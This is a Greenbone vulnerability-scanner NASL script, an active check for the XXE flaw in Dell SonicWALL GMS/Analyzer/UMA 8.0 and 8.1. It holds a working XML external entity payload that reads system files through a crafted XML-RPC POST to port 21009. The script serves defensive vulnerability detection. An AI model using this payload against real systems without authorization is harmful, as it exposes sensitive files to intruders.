# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105873");
  script_version("2025-09-12T05:38:45+0000");
  script_tag(name:"last_modification", value:"2025-09-12 05:38:45 +0000 (Fri, 12 Sep 2025)");
  script_tag(name:"creation_date", value:"2016-08-16 14:22:12 +0200 (Tue, 16 Aug 2016)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Dell SonicWALL GMS/Analyzer/UMA 8.0, 8.1 XXE Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_sonicwall_ums_gms_analyzer_http_detect.nasl", "os_detection.nasl");
  script_require_ports(21009);
  script_mandatory_keys("sonicwall/ums/detected");

  script_tag(name:"summary", value:"Dell SonicWALL GMS/Analyzer/UMA is prone to an XML external
  entity (XXE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted XML-RPC POST request and checks the
  response.");

  script_tag(name:"insight", value:"Vulnerabilities were found pertaining to command injection,
  unauthorized XXE, default account and unauthorized modification of virtual appliance networking
  information.");

  script_tag(name:"affected", value:"Dell SonicWALL GMS/Analyzer/UMA versions 8.0 and 8.1.");

  script_tag(name:"solution", value:"GMS/Analyzer/UMA Hotfix 174525 is available.");

  script_xref(name:"URL", value:"https://www.sonicwall.com/support/product-notification/sonicwall-critical-product-notification-gms-and-analyzer-mandatory-hotfix/170608411295618");
  script_xref(name:"URL", value:"https://www.sonicwall.com/support/product-notification/sonicwall-service-bulletin-gms-analyzer-vulnerability-fix-july-2016/170608775672509");
  script_xref(name:"URL", value:"https://web.archive.org/web/20170320214504/https://www.digitaldefense.com/vrt-discoveries/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");

port = 21009;
if( ! get_port_state( port ) )
  exit( 0 );

vtstrings = get_vt_strings();
vtstring = vtstrings["default"];
vtstring_lower = vtstrings["lowercase"];

files = traversal_files();

foreach pattern( keys( files ) ) {

  file = files[pattern];

  xml_rpc = '<?xml version="1.0" encoding="UTF-8"?>' +
            '<!DOCTYPE ' + vtstring + ' [<!ELEMENT ' + vtstring + ' ANY >' +
            '<!ENTITY ' + vtstring_lower + ' SYSTEM "file:///' + file + '">]>' +
            '<methodCall><methodName>' + vtstring + '</methodName>' +
            '<params><param><value><struct><member><name>' + vtstring + '</name>' +
            '<value><i4>&' + vtstring_lower + ';</i4></value><params><param></methodCall>';

  req = http_post_put_req( port:port,
                           url:"/",
                           data:xml_rpc,
                           add_headers:make_array( "Content-Type","text/xml" ) );
  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if( egrep( string:buf, pattern:pattern, icase:TRUE ) ) {
    report = 'By sending a special crafted POST request it was possible to read /' + file +
             '. Response:\n\n' + buf;
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
